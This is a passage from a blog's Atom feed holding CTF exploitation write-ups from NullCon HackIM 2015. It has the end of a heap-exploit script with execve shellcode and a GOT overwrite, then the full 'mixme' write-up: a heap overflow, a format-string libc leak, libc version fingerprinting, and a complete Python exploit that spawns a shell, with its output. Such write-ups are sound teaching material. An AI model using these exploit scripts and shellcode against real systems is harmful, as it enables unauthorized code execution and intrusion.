sc = "\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"
# prepend shellcode with a little NOP sled
payload += "\x90"*(212-len(sc))
payload += sc
# overwrite note_info struct
payload += p(0x804b024-8)     # __isoc99_scanf@got.plt-8
payload += p(shellcode)       # heap location of shellcode

payload += "\n"
s.send(payload)

# request deletion of a note, triggering our write-what-where
# we overwrite a function pointer in the got with the location
# of our shellcode
time.sleep(0.5)
s.send("2\n3\n")

time.sleep(0.5)
s.recv(512)

# shell incoming!
print "[+] Enjoy your shell!"

import telnetlib
t = telnetlib.Telnet()
t.sock = s
t.interact()

s.close()
</code></pre>

<pre><code>bas@tritonal:~/tmp/nullcon/exp400$ python sploit.py 
[+] Trying to leaking heap address...
[+] Leaked heap address at 0x85cf1d0
[+] Shellcode at 0x85cf100
[+] Sending new notes to overwrite got pointer...
[+] Enjoy your shell!
id
/bin//sh: 1: id: not found
cat flag.txt
flag{y0u_br0k3_1n70_5h3rl0ck_m1ndp4l4c3}
</code></pre>

<p>The flag was <code>flag{y0u_br0k3_1n70_5h3rl0ck_m1ndp4l4c3}</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[HackIM CTF - Mixme]]></title>
    <link href="http://barrebas.github.io/blog/2015/01/11/hackim-ctf-mixme-writeup/"/>
    <updated>2015-01-11T18:52:35+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/01/11/hackim-ctf-mixme-writeup</id>
    <content type="html"><![CDATA[<p><code>mixme</code> was a 400 points exploitation challenge of the NullCon HackIM ctf. We solved it with just 20 minutes on the clock!</p>

<!-- more -->


<p>When started, <code>mixme</code> present the following:</p>

<pre><code>==========================================
======== Uncle Podger's Data Store =======
==========================================

Select op (store/get/edit/exit): store
Name: a
Size: 4
Enter data: AAAA
Select op (store/get/edit/exit): get
Name: a
Size: 4
AAAASelect op (store/get/edit/exit): get
Name: a
Size: 4
Not found
Select op (store/get/edit/exit): Invalid input
Select op (store/get/edit/exit): 
</code></pre>

<p>Again, some kind of note storage. The binary was first reverse-engineered by superkojiman, who immediately noticed something odd: upon <code>get</code>ing a note, the program erases the note by <code>free()</code>ing the memory and NULLing the first few bytes. The rest of the bytes were left intact. This led us to think about possible use-after-free scenarios. Turns out it was something different&hellip;</p>

<p>I started tinkering with the binary. I could store notes and get them back, but only if I supplied the right size. However, I noticed that I could <em>edit</em> a note with a larger value than was allocated. The heap looks like this after allocating three notes <code>a</code>, <code>b</code> and <code>c</code> with length 4 and contents <code>AAAA</code>, <code>BBBB</code>, and <code>CCCC</code>, respectively:</p>

<pre><code># allocated three notes, in heap:
0x8314000:  0x00000000  0x00000029  0x44414548  0x00000000
0x8314010:  0x00000000  0x00000000  0x00000000  0x00000000
0x8314020:  0x08314030  0x083140a0  0x00000000  0x00000029
0x8314030:  0x00000061  0x00000000  0x00000000  0x00000000
0x8314040:  0x00000004  0x08314058  0x08314068  0x08314008
0x8314050:  0x00000000  0x00000011  0x41414141  0x00000000
0x8314060:  0x00000000  0x00000029  0x00000062  0x00000000
0x8314070:  0x00000000  0x00000000  0x00000004  0x08314090
0x8314080:  0x083140a0  0x08314030  0x00000000  0x00000011
0x8314090:  0x42424242  0x00000000  0x00000000  0x00000029
0x83140a0:  0x00000063  0x00000000  0x00000000  0x00000000
0x83140b0:  0x00000004  0x083140c8  0x08314008  0x08314068
0x83140c0:  0x00000000  0x00000011  0x43434343  0x00000000
0x83140d0:  0x00000000  0x00020f31  0x00000000  0x00000000
0x83140e0:  0x00000000  0x00000000  0x00000000  0x00000000
</code></pre>

<p>At <code>0x8314030</code>, we see the first note&rsquo;s name, <code>a</code>. The zeroeth note is called <code>HEAD</code> and precedes our first note. Each note is contained within a struct, which contains pointers to the previous and next note (a doubly linked list). The meta-data for note <code>a</code> contains this pointer: <code>0x08314058</code>, which points to the data associated with that note: <code>AAAA</code>. The meta-data for the note looks something like this:</p>

<pre><code class="c">note_info struct {
    char name[16];
    int length;
    char *content;
    note_info *next_note;
    note_info *prev_note;
};
</code></pre>

<p>This also is true for the next note, <code>b</code>, which is immediately after <code>a</code> in memory. We can overwrite the meta-data of note <code>b</code> by editing note <code>a</code>.</p>

<h2>Overflowing the heap</h2>

<p>If we supply 40 bytes when editing <code>a</code> and supplying forty times <code>0x41</code>, we overwrite several parts of the meta-data of note <code>b</code>:</p>

<pre><code># after editing 'a' with 40 bytes where 4 is allocated:
0x8314000:  0x00000000  0x00000029  0x44414548  0x00000000
0x8314010:  0x00000000  0x00000000  0x00000000  0x00000000
0x8314020:  0x083140a0  0x083140a0  0x00000000  0x00000029
0x8314030:  0x00000061  0x00000000  0x00000000  0x00000000
0x8314040:  0x00000004  0x08314058  0x08314068  0x08314008
0x8314050:  0x00000000  0x00000011  0x41414141  0x41414141
0x8314060:  0x41414141  0x41414141  0x41414141  0x41414141
0x8314070:  0x41414141  0x41414141  0x41414141  0x41414141
0x8314080:  0x083140a0  0x08314008  0x00000000  0x00000011
0x8314090:  0x42424242  0x42424242  0x42424242  0x42424242
0x83140a0:  0x42424242  0x42424242  0x42424242  0x42424242
0x83140b0:  0x42424242  0x083140c8  0x08314008  0x08314008
0x83140c0:  0x00000000  0x00000011  0x43434343  0x00000000
0x83140d0:  0x00000000  0x00020f31  0x00000000  0x00000000
0x83140e0:  0x00000000  0x00000000  0x00000000  0x00000000
</code></pre>

<p>If we now try to <code>get</code> note <code>b</code>, the binary will segfault because the pointer to the note&rsquo;s data is set to <code>0x41414141</code>. We can use this to make note <code>b</code> point to <code>free@got</code> with a bit of python. The binary is started using socat to make it listen on a port.</p>

<pre><code># set 'a' with large buffer, overwriting meta-data of 'b':
0x8314000:  0x00000000  0x00000029  0x44414548  0x00000000
0x8314010:  0x00000000  0x00000000  0x00000000  0x00000000
0x8314020:  0x083140a0  0x083140a0  0x00000000  0x00000029
0x8314030:  0x00000061  0x00000000  0x00000000  0x00000000
0x8314040:  0x00000004  0x08314058  0x08314068  0x08314008
0x8314050:  0x00000000  0x00000011  0x41414141  0x41414141
0x8314060:  0x41414141  0x00000029  0x00000062  0x41414141
0x8314070:  0x41414141  0x41414141  0x00000024  0x08314090
0x8314080:  0x083140a0  0x08314008  0x00000000  0x00000011
0x8314090:  0x42424242  0x42424242  0x42424242  0x42424242
0x83140a0:  0x42424242  0x42424242  0x42424242  0x42424242
0x83140b0:  0x42424242  0x083140c8  0x08314008  0x08314008
0x83140c0:  0x00000000  0x00000011  0x43434343  0x00000000
0x83140d0:  0x00000000  0x00020f31  0x00000000  0x00000000
0x83140e0:  0x00000000  0x00000000  0x00000000  0x00000000
</code></pre>

<p>Notice that I&rsquo;ve kept the bytes at <code>0x8314064</code> and <code>0x8314068</code> the same: <code>0x00000029 0x00000062</code>. If these are overwritten, then the binary cannot find note <code>b</code> anymore, which effectively stops our attack! I overwrote the pointer to the data with <code>0x804b020</code>. This is the pointer to <code>free()</code> in the Global Offset Table. Remember, after every <code>get</code> sent to the binary, <code>free()</code> is called. By overwriting the pointer to the note data, we can set any memory to arbitrary values with an <code>edit b</code> command to the binary!</p>

<h2>Control of execution</h2>

<p>I tested this hypothesis with the following python:</p>

<pre><code class="python">import re
import string
import struct
import socket
import time
import telnetlib
import sys

def p(x):
    return struct.pack('&lt;L', x)

# function to send commands to the binary
def z(sock, x):
    sock.send(x + '\n')
    time.sleep(0.01)
    data = sock.recv(200)
    time.sleep(0.01)
    return data

# connect to remote host
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 9005))

# receive banner
s.recv(512)

# ask the binary to store three notes
# we'll overflow a into b later on
z(s, "store")
z(s, "a")
z(s, "4")
z(s, "AAAA")

z(s, "store")
z(s, "b")
z(s, "4")
z(s, "BBBB")

z(s, "store")
z(s, "c")
z(s, "4")
z(s, "CCCC")

# edit a with a large value
# this overflows and overwrites the note_info struct of b
# the pointer to the data is overwriting with free@got
print "[+] overflowing a to set b to free@got"
z(s, 'edit')
z(s, 'a')
z(s, '40')
z(s, "A"*12+"\x29\x00\x00\x00\x62\x00\x00\x00"+"A"*12+p(4)+p(0x804b020))
#     ^ overflow    ^ restore 0x29, 'b'               ^ size of b ^ free@got

# overwrite free@got with printf
print "[+] replacing free() with printf()"
z(s, 'edit')
z(s, 'b')
z(s, '4')
z(s, 'BBBB')

z(s, 'get')
z(s, 'c')
z(s, '4')
</code></pre>

<p>This made the binary crash. The coredump reported the following:</p>

<pre><code class="python">#0  0x42424242 in ?? ()
gdb-peda$ i r
eax            0x843b0c8    0x843b0c8
ecx            0x843b0c8    0x843b0c8
edx            0x4  0x4
ebx            0xb779cff4   0xb779cff4
esp            0xbf95245c   0xbf95245c
ebp            0xbf952498   0xbf952498
esi            0x0  0x0
edi            0x0  0x0
eip            0x42424242   0x42424242
eflags         0x10207  [ CF PF IF RF ]
cs             0x73 0x73
ss             0x7b 0x7b
ds             0x7b 0x7b
es             0x7b 0x7b
fs             0x0  0x0
gs             0x33 0x33
gdb-peda$ p system
$1 = {&lt;text variable, no debug info&gt;} 0xb7636060 &lt;system&gt;
gdb-peda$ x/4x $esp
0xbf95245c: 0x08048bb8  0x0843b0c8  0x0843b0c8  0x00000004

gdb-peda$ x/4x $eax
0x843b0c8:  0x43434343  0x00000000
</code></pre>

<p>Bloody awesome! We not only have control over EIP, but also eax, ecx and the first argument on the stack point to memory that we control. This will come in handy later.</p>

<h2>Turning the heap overflow into a format string vulnerability</h2>

<p>With what should I overwrote the got pointer to <code>free()</code> though? I looked for ROP gadgets, but there weren&rsquo;t enough to pivot the stack into the heap and spawn a shell, or open/read/write the flag to stdout. Furthermore, I assumed ASLR was enabled so I had to leak libc addresses first.</p>

<p>After thinking about it, I chose to overwrite <code>free@got</code> with <code>printf@plt</code>. This turns the heap overflow into a format string vulnerability! Maybe this is where the challenge name comes from&hellip;</p>

<p>After setting <code>free@got</code> to <code>printf@plt</code>, whenever I ask the binary to <code>get</code> a note, I can print whatever content is associated with that note (because <code>free()</code> is called with the pointer to the content of the note).</p>

<p>I examined the stack by supplying a format string consisting of a bunch of <code>%x</code>&rsquo;s. Obviously, I couldn&rsquo;t dig up my own format string from the stack, because the format string itself is on the heap!</p>

<h2>What&rsquo;s that gem?</h2>

<p>Examining the stack, I dumped the following data:</p>

<pre><code># local binary
85850c8-122-b75c77b0-122-85850a0-85850a0-63... &lt;snip&gt;
</code></pre>

<p>That third address looks promising! It points into <code>libc</code>. Unfortunately, there&rsquo;s a problem. Running the script against the server gave a different address:</p>

<pre><code># remote binary
83370c8-122-b75c0024-122-83370a0-83370a0-b7000063-... &lt;snip&gt;
936e0c8-122-b764a024-122-936e0a0-936e0a0-b7000063-... &lt;snip&gt;
</code></pre>

<p>We notice two things: ALSR is on and the remote binary seems to have a different libc than my local box (which was an Ubuntu 12.04 VM). I turned the format string into <code>%3$s</code> to find out which bytes were on the local and remote libc address. For the local binary, it returned <code>0x168bc085</code>. For the remote binary, however, it returned <code>0x7501c083</code>. These differences pointed towards different versions of libc. This was a nightmare! How am I supposed to find anything useful in libc without access to the specific library?</p>

<h2>Finding the correct libc</h2>

<p>I decided to try and identify the libc version. With less than 60 minutes to go, I went for it. If I had the right version of libc, I had everything to leak a libc address, add an offset to get <code>system()</code> and spawn a shell. I tried to nmap the remote server, which seemed too slow. However, <code>ssh</code> was enabled:</p>

<pre><code class="bash">bas@tritonal:~/tmp/nullcon/mixme$ ssh test@54.163.248.69 -vvv
OpenSSH_6.0p1 Debian-4+deb7u2, OpenSSL 1.0.1e 11 Feb 2013
debug1: Reading configuration data /etc/ssh/ssh_config
debug1: /etc/ssh/ssh_config line 19: Applying options for *
debug2: ssh_connect: needpriv 0
debug1: Connecting to 54.163.248.69 [54.163.248.69] port 22.
debug1: Connection established.
debug1: identity file /home/bas/.ssh/id_rsa type -1
debug1: identity file /home/bas/.ssh/id_rsa-cert type -1
debug1: identity file /home/bas/.ssh/id_dsa type -1
debug1: identity file /home/bas/.ssh/id_dsa-cert type -1
debug1: identity file /home/bas/.ssh/id_ecdsa type -1
debug1: identity file /home/bas/.ssh/id_ecdsa-cert type -1
debug1: Remote protocol version 2.0, remote software version OpenSSH_6.6.1p1 Ubuntu-2ubuntu2
&lt;snip&gt;
</code></pre>

<p>Googling <code>OpenSSH_6.6.1p1 Ubuntu-2ubuntu2</code> led me to believe that Ubuntu 14.04 was being run. I downloaded all the i386 libc version I could find, unpacked them and searched them for the bytes I just leaked:</p>

<pre><code class="bash">bas@tritonal:~/tmp/nullcon/mixme/libc$ for i in `ls`; do echo $i; echo; xxd $i | egrep '83.?c0.?01.?75'; echo; done


libc-2.15-0ubuntu10.9.so

0043740: 8934 24e8 f8f4 0200 83c0 0175 b0c7 8570  .4$........u...p
00460a0: 0000 0089 3424 e895 cb02 0083 c001 75bb  ....4$........u.
0046720: 0200 83c0 0175 80c7 8570 fbff ffff ffff  .....u...p......
0046810: 2cc4 0200 83c0 0175 a5c7 8570 fbff ffff  ,......u...p....
0046890: e8ab c302 0083 c001 75ac c785 70fb ffff  ........u...p...
0047320: 4424 04e8 18b9 0200 83c0 0175 80c7 8570  D$.........u...p
0047410: 0000 0089 3424 e825 b802 0083 c001 75a4  ....4$.%......u.
005a180: 83c0 0175 a4c7 85b0 efff ffff ffff ffe9  ...u............
005b410: 3424 e8f9 1001 0083 c001 75ae c785 b0ef  4$........u.....
005c370: 0089 3424 e897 0101 0083 c001 7580 c785  ..4$........u...
00674c0: 0a00 0000 8904 24e8 74b7 0000 83c0 0175  ......$.t......u

libc-2.16-0ubuntu6.so

0047b50: 83c0 0175 a8e9 97bf ffff 81e1 ff00 0000  ...u............
005ad90: 0083 c001 75b9 e95b ccff ff8b 4d10 8b45  ....u..[....M..E
0066ab0: 7cb4 0000 83c0 0175 918d b426 0000 0000  |......u...&amp;....

libc-2.19-0ubuntu6.4.so

00471c0: 0489 3424 e817 9e02 0083 c001 758a e9d1  ..4$........u...
0047920: 24e8 ba96 0200 83c0 0175 c5e9 74c2 ffff  $........u..t...
005a850: 8904 24e8 d801 0100 83c0 0175 b8e9 04cc  ..$........u....
005b3a0: 83c0 0175 c9e9 bcc0 ffff a810 8d74 2600  ...u.........t&amp;.
0066020: bcaf 0000 83c0 0175 988d b426 0000 0000  .......u...&amp;....

libc-2.19-13ubuntu3.so

00472a0: 0489 3424 e877 9c02 0083 c001 758a e9d1  ..4$.w......u...
0047a00: 0000 8934 24e8 1695 0200 83c0 0175 c5e9  ...4$........u..
0050e40: 8904 24e8 6879 0100 83c0 0175 b8e9 04cc  ..$.hy.....u....
0051990: 83c0 0175 c9e9 bcc0 ffff a810 8d74 2600  ...u.........t&amp;.
0066100: 1cae 0000 83c0 0175 988d b426 0000 0000  .......u...&amp;....
</code></pre>

<p>I struck gold with libc-2.19-0ubuntu6.4.so:</p>

<pre><code>0066020: bcaf 0000 83c0 0175 988d b426 0000 0000  .......u...&amp;....
</code></pre>

<p>Those bytes (0x7501c083) where at an offset of <code>xxxx6024</code> in the binary, which looked very much like the third address on the stack dumped from the remote binary. This had to be the right libc version! I loaded up the binary on my Ubuntu VM with libc-2.19-0ubuntu6.4.so:</p>

<pre><code class="bash">LD_PRELOAD=./libc-2.19-0ubuntu6.14.so ./mixme
</code></pre>

<p>and attached <code>gdb</code> to dump the address of <code>system()</code>. Using the aforementioned value from the stack, I calculated the offset to <code>system()</code>. I quickly modified my script to include this, overwriting <code>free@got</code> with <code>system()</code>. When I now made a note with the value <code>/bin/sh</code> and asked the binary to <code>get</code> that note, it wants to <code>free()</code> it. However, <code>free@got</code> is replaced with system(), effectively making the binary call <code>system('/bin/sh');</code>!</p>

<p>So, in true dirty-ctf-style, the following python script was written after hours of frantic tracing with gdb and coding in python.</p>

<pre><code class="python">import re
import string
import struct
import socket
import time
import telnetlib
import sys

def p(x):
    return struct.pack('&lt;L', x)

# function to send commands to the binary
def z(sock, x):
    sock.send(x + '\n')
    time.sleep(0.01)
    data = sock.recv(200)
    time.sleep(0.01)
    return data

# connect to remote host
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('54.163.248.69', 9005))

# receive banner
s.recv(512)

# ask the binary to store three notes
# we'll overflow a into b later on
z(s, "store")
z(s, "a")
z(s, "4")
z(s, "AAAA")

z(s, "store")
z(s, "b")
z(s, "4")
z(s, "BBBB")

# the third note will hold our format string
z(s, "store")
z(s, "c")
format_str = "--%3$x"
z(s, str(len(format_str)))
z(s, format_str)

# edit a with a large value
# this overflows and overwrites the note_info struct of b
# the pointer to the data is overwriting with free@got
print "[+] overflowing a to set b to free@got"
z(s, 'edit')
z(s, 'a')
z(s, '40')
z(s, "A"*12+"\x29\x00\x00\x00\x62\x00\x00\x00"+"A"*12+p(4)+p(0x804b020))
#     ^ overflow    ^ restore 0x29, 'b'               ^ size of b ^ free@got

# overwrite free@got with printf
print "[+] replacing free() with printf()"
z(s, 'edit')
z(s, 'b')
z(s, '4')
z(s, p(0x080485f0)) # free@got overwritten with printf

# now 'get' c and trigger the format string vulnerability
print "[+] triggering format string"
z(s, "get")
z(s, "c")
data = z(s, str(len(format_str)))
time.sleep(0.1)

# this proved to be a bit finicky:
data += s.recv(256)
data += s.recv(256)

print data
# grab leaked libc address
m = re.findall(r'x--(.*)cSel', data)
if m: 
    print m
    leak = "0x"+m[0]
    leak_hex = int(leak, 16)
    print "[+] found first addr: {}".format(hex(leak_hex))
    system = leak_hex - 155428
    print "[+] system @ {}".format(hex(system))

# repeat the same trick, but this time, overwrite free@got with system()
# first note contains /bin/sh, used as argument for system()
z(s, "store")
z(s, "sh")
z(s, "7")
z(s, "/bin/sh")

z(s, "store")
z(s, "t")
z(s, "4")
z(s, "TTTT")

z(s, "store")
z(s, "q")
z(s, "4")
z(s, "QQQQ")

print "[+] overflowing t to set q to free@got"
z(s, 'edit')
z(s, 't')
z(s, '40')
z(s, "A"*12+"\x29\x00\x00\x00\x71\x00\x00\x00"+"A"*12+p(4)+p(0x804b020))
#     ^ overflow              ^ restore 'q'           ^ size of q  ^ free@got

print "[+] replacing free() with system()"
z(s, 'edit')
z(s, 'q')
z(s, '4')
z(s, p(system))     # free@got overwritten with system

# trigger system('/bin/sh')
z(s, 'get')
z(s, 'sh')  # this note contains '/bin/sh' and those contents are passed to system()
z(s, '7')

# shell spawned, interact with it!
t=telnetlib.Telnet()
t.sock=s
t.interact()

s.close()
</code></pre>

<p>I ran it, and to my surprise, I got it right the first time! I dropped into a shell on the remote box:</p>

<pre><code class="bash">root@ubuntu-VirtualBox:/home/ubuntu/nullcon/mixme# python exploit.py
[+] overflowing a to set b to free@got
[+] replacing free() with printf()
[+] triggering format string
Name: Size: --%3$x--b768d024cSelect op (store/get/edit/exit): 
['b768d024']
[+] found first addr: 0xb768d024L
[+] system @ 0xb7667100L
[+] overflowing t to set q to free@got
[+] replacing free() with system()
/bin/sh
id
uid=1005 gid=1005 groups=0
cat flag.txt
aw3s0m3++_hipp1e_pwn_r0ckst4r
</code></pre>

<p>The flag was <code>aw3s0m3++_hipp1e_pwn_r0ckst4r</code>. This one was really though and I&rsquo;m glad I managed to beat it with just 20 minutes left for the ctf!</p>
]]></content>
  </entry>
  
</feed>
